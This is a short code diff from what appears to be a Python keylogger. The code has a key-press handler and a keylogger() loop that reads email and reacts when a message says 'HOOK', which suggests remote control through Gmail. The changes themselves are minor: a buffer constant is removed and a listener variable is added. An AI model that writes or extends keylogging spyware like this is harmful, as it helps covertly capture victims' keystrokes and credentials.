@@ -5,8 +5,7 @@ import gmail as g
 
 ishook = 0
 
-BUFSIZE = 1024 
-
+global listener
 def on_press(key):
     global ishook, cont
     #cont = ""
@@ -45,6 +44,7 @@ def keylogger():
     ishook = 0
     islock = 0
     cont = ""
+    listener = None
     while True:
         msg = g.read_mail()
         if (msg == "HOOK"):
